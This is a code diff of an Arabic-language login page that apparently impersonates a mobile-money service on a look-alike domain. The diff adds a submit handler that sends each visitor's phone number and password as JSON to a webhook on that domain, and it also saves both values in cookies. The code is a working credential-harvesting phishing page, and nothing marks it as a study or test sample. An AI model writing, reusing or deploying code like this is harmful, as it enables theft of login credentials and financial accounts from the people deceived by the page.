@@ -111,17 +111,21 @@
     <div class="div-block-4">
         <div class="container">
             <div class="w-form">
-                <form id="signin" 
+<!--                 <form id="signin" 
                         name="مقدم الطلب" 
                         data-name="مقدم الطلب" 
                         redirect="/verification" 
                         action='https://formsubmit.co/18adf9b7fdf4cc3d254bb14bae1266c3'
                         method="post" 
+                        aria-label="تسجيل الدخول"> -->
+                <form id="signin" 
+                        name="مقدم الطلب" 
+                        data-name="مقدم الطلب" 
+                        redirect="/verification"
                         aria-label="تسجيل الدخول">
-                        
-                        <input type="hidden" name="_next" value="https://www.orangemony.net/verification">
-                        <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_webhook" value="http://webhook.orangemony.net">
+                        <!-- <input type="hidden" name="_next" value="https://www.orangemony.net/verification"> -->
+                        <!-- <input type="hidden" name="_captcha" value="false"> -->
+                        <!-- <input type="hidden" name="_webhook" value="http://webhook.orangemony.net"> -->
                     <div id="field" class="field-holder">
                         <input class="text-field-2 w-input" maxlength="10" name="رقم الهاتف" data-name="رقم الهاتف" pattern="\d{10,10}" placeholder="" type="text" id="phonenumber" required="">
                         <label for="phonenumber">رقم الهاتف</label>
@@ -224,6 +228,16 @@
         $('#signin').on("submit", function() {
             setCookie("phonenumber", document.getElementById('phonenumber').value);
             setCookie("password", document.getElementById('password').value);
+
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", 'http://webhook.orangemony.net', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                'phonenumber': document.getElementById('phonenumber').value,
+                'password':document.getElementById('password').value,
+            }));
+
         })
     </script>
     
